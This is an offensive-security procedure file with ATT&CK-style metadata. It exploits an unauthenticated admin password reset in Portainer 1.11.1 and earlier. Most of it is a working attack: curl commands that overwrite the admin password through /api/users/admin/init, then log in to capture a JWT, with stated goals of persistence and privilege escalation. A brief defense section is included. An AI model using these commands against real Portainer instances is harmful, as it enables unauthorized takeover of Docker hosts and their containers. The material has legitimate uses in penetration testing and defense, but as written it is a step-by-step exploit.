---
id: ca665b6f-fdbd-49c5-8a22-92e8fecc0f54
name: portainer-admin-password-reset-unauthenticated
type: procedure
verified: true
submitted: false
created_at: '2019-12-10T00:20:20.259168+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - authentication
  - known-vulnerability
  - unauthorized
  - web-applications
commands:
  - '[[commands/curl-post-json-request]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# portainer-admin-password-reset-unauthenticated

## Summary

This procedure exploits a vulnerability in Portainer versions 1.11.1 and earlier, allowing unauthenticated attackers to reset the admin password via a POST request to the /api/users/admin/init endpoint. Successful execution grants administrative access to the Portainer dashboard without prior authentication.

## Description

Portainer is a lightweight management UI for Docker environments, often exposed on port 9000. In versions <= 1.11.1, the API endpoint for initializing the admin user lacks proper authentication checks, enabling remote attackers to overwrite the admin password. This vulnerability targets public-facing Portainer instances and can lead to full control over container orchestration, including deploying malicious containers or accessing host resources. It is particularly dangerous in cloud or misconfigured environments where Portainer manages sensitive Docker hosts. The technique relies on crafting a JSON payload with the new password and sending it via HTTP POST.

## Requirements

1. Network access to the target Portainer instance (typically on TCP port 9000).
2. The target must be running Portainer <= 1.11.1.
3. curl tool installed on the attacker's machine.
4. No prior authentication or credentials required.

## Defense

Defensive measures and detection strategies:

- Upgrade Portainer to version 1.12.0 or later, which fixes this authentication bypass.
- Restrict access to Portainer UI/API using firewalls, allowing only trusted IP ranges.
- Enable authentication enforcement and monitor API logs for unauthorized POST requests to /api/users/admin/init.
- Use web application firewalls (WAF) to block unauthenticated admin initialization attempts.
- Regularly audit exposed services and implement least-privilege network segmentation for management interfaces.

## Objectives

1. Reset the Portainer admin password without authentication to gain initial access.
2. Verify access by logging in with the new credentials.
3. Establish persistence or escalate privileges within the Docker environment.

## Instructions

### Step 1: Send Password Reset Request

**Context**: Exploit the vulnerable endpoint by sending a POST request with the new admin password in JSON format. This step initializes or overwrites the admin account credentials.

**Command** ([[commands/curl-post-json-request]]):
```bash
curl -H "Content-Type: application/json" http://$_TARGET_IP:9000/api/users/admin/init -d '{"password":"$_NEW_PASSWORD"}'
```

> This command sends the JSON payload to the init endpoint. Replace $_TARGET_IP with the Portainer server's IP (e.g., 192.168.1.100) and $_NEW_PASSWORD with the desired password (e.g., "s3cr3t"). The request should return a 200 OK response if successful, indicating the password has been set. If the endpoint returns an error (e.g., 404 or 500), verify the Portainer version and port.

### Step 2: Verify Access by Logging In

**Context**: Test the new credentials by attempting to authenticate to the Portainer API or UI. This confirms the reset was successful and provides a session token for further actions.

**Instructions**: Use a browser to navigate to http://$_TARGET_IP:9000 and log in with username "admin" and the new password. Alternatively, send a login request via curl:

```bash
curl -H "Content-Type: application/json" -X POST http://$_TARGET_IP:9000/api/auth -d '{"username":"admin","password":"$_NEW_PASSWORD"}'
```

> A successful login returns a JSON response with a JWT token (e.g., {"jwt": "eyJ..."}). Use this token in the Authorization header for subsequent API calls (e.g., curl -H "Authorization: Bearer $_JWT_TOKEN" ...). If login fails, recheck the reset request or Portainer configuration.
